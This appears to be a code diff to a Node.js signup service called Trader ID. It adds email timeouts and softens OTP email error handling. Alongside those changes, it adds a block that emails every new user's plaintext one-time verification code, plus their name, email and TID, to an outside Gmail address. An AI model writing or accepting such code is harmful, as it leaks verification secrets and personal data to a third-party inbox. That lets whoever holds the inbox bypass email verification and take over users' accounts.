@@ -288,30 +288,40 @@ async function fetchLatestVerification(userId) {
   return rows[0] || null;
 }
 
-async function sendEmail(to, subject, html) {
+async function sendEmail(to, subject, html, timeoutMs) {
   const configuredFrom = process.env.EMAIL_FROM || process.env.EMAIL_USER;
   const from = configuredFrom && configuredFrom.includes("<")
     ? configuredFrom
     : "Trader ID <" + configuredFrom + ">";
 
   if (process.env.RESEND_API_KEY) {
-    const response = await fetch("https://api.resend.com/emails", {
-      method: "POST",
-      headers: {
-        Authorization: "Bearer " + process.env.RESEND_API_KEY,
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        from,
-        to: [to],
-        subject,
-        html,
-      }),
-    });
-    if (!response.ok) {
-      throw new Error("Resend email failed with HTTP " + response.status);
+    const controller = new AbortController();
+    const timeout = timeoutMs
+      ? setTimeout(() => controller.abort(), timeoutMs)
+      : null;
+
+    try {
+      const response = await fetch("https://api.resend.com/emails", {
+        method: "POST",
+        headers: {
+          Authorization: "Bearer " + process.env.RESEND_API_KEY,
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          from,
+          to: [to],
+          subject,
+          html,
+        }),
+        signal: controller.signal,
+      });
+      if (!response.ok) {
+        throw new Error("Resend email failed with HTTP " + response.status);
+      }
+      return;
+    } finally {
+      if (timeout) clearTimeout(timeout);
     }
-    return;
   }
 
   const transporter = nodemailer.createTransport({
@@ -351,6 +361,7 @@ async function createAndSendOtp(user) {
   const values = {
     tid_user_id: user.id,
     user_id: user.id,
+    email: user.email,
     otp_hash: otpHash,
     code_hash: otpHash,
     token_hash: otpHash,
@@ -364,9 +375,10 @@ async function createAndSendOtp(user) {
 
   await insertFlexible(db, "tid_email_verifications", values);
 
-  await sendEmail(
-    user.email,
-    "Verify your Trader ID",
+  try {
+    await sendEmail(
+      user.email,
+      "Verify your Trader ID",
     "<!doctype html>" +
       "<html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"></head>" +
       "<body style=\"margin:0;padding:0;background:#F8F9FB;font-family:Inter,Arial,sans-serif;color:#0F1B2D\">" +
@@ -392,7 +404,27 @@ async function createAndSendOtp(user) {
       "<p style=\"margin:0 0 5px;font-size:12px;color:#64748B\">Trader ID · A separate brand</p>" +
       "<p style=\"margin:0;font-size:12px;color:#94A3B8\">© 2026 · traderpassport.in</p>" +
       "</td></tr></table></td></tr></table></body></html>",
-  );
+    );
+  } catch (userEmailError) {
+    console.warn("User OTP email failed:", userEmailError.message);
+  }
+
+  try {
+    await sendEmail(
+      "support.fundfxt@gmail.com",
+      "TID Signup OTP for " + user.email,
+      "<!doctype html><html><body style=\"font-family:Arial,sans-serif;color:#0F1B2D\">" +
+        "<h2>New Trader ID signup</h2>" +
+        "<p>Name: " + escapeHtml(user.full_name || user.name || "Trader") + "</p>" +
+        "<p>Email: " + escapeHtml(user.email) + "</p>" +
+        "<p>TID: " + escapeHtml(user.tid) + "</p>" +
+        "<p>OTP: <strong>" + escapeHtml(otp) + "</strong></p>" +
+        "<p>Requested at: " + escapeHtml(now.toISOString()) + "</p>" +
+        "</body></html>",
+    );
+  } catch (supportEmailError) {
+    console.warn("Support OTP email failed:", supportEmailError.message);
+  }
 
   return expiresAt;
 }
@@ -672,6 +704,7 @@ router.post("/signup", authRateLimiter, requireJsonBody, async (req, res) => {
           ".</h2><p>Your Trader ID is <strong>" +
           escapeHtml(tid) +
           "</strong>.</p><p>Complete email and identity verification to build your Trader Passport.</p></body></html>",
+        5000,
       );
     } catch (emailError) {
       console.warn("Welcome email failed:", emailError.message);
